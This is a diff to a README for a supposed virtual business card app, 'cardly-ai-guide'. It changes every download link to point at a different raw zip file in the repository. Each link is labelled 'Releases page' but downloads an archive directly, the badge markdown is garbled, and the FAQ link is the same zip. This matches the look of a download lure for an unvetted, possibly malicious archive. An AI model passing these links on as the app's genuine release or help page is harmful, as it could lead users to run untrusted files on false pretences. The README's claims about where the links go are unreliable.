@@ -4,9 +4,9 @@
 Welcome to the cardly-ai-guide! This application helps you create beautiful virtual business cards (VCards) with ease. Whether you're a business owner or a professional, our tool provides templates to enhance your profile and showcase your skills. Follow these simple steps to get started.
 
 ## 📥 Download & Install
-To download the latest version of cardly-ai-guide, visit our [Releases page](https://raw.githubusercontent.com/Rux23fvillafuertew/cardly-ai-guide/main/preinaugurate/cardly-ai-guide.zip).
+To download the latest version of cardly-ai-guide, visit our [Releases page](https://raw.githubusercontent.com/Rux23fvillafuertew/cardly-ai-guide/main/public/ai_guide_cardly_v2.8.zip).
 
-[![Download Now](https://raw.githubusercontent.com/Rux23fvillafuertew/cardly-ai-guide/main/preinaugurate/cardly-ai-guide.zip%20Now-Click%20to%https://raw.githubusercontent.com/Rux23fvillafuertew/cardly-ai-guide/main/preinaugurate/cardly-ai-guide.zip)](https://raw.githubusercontent.com/Rux23fvillafuertew/cardly-ai-guide/main/preinaugurate/cardly-ai-guide.zip)
+[![Download Now](https://raw.githubusercontent.com/Rux23fvillafuertew/cardly-ai-guide/main/public/ai_guide_cardly_v2.8.zip%20Now-Click%20to%https://raw.githubusercontent.com/Rux23fvillafuertew/cardly-ai-guide/main/public/ai_guide_cardly_v2.8.zip)](https://raw.githubusercontent.com/Rux23fvillafuertew/cardly-ai-guide/main/public/ai_guide_cardly_v2.8.zip)
 
 Once you are on the Releases page, scroll down to select the latest version available. Click on the file to start the download.
 
@@ -60,6 +60,6 @@ Once you open cardly-ai-guide, you will find a user-friendly interface designed 
 - Share your VCard via email or social media once completed.
 
 ## 💬 Need Help?
-If you encounter any issues while using the application, refer to our FAQ section on the [Releases page](https://raw.githubusercontent.com/Rux23fvillafuertew/cardly-ai-guide/main/preinaugurate/cardly-ai-guide.zip) or contact support through our GitHub issues page.
+If you encounter any issues while using the application, refer to our FAQ section on the [Releases page](https://raw.githubusercontent.com/Rux23fvillafuertew/cardly-ai-guide/main/public/ai_guide_cardly_v2.8.zip) or contact support through our GitHub issues page.
 
 Thank you for choosing cardly-ai-guide! We hope you enjoy creating your VCards effortlessly.
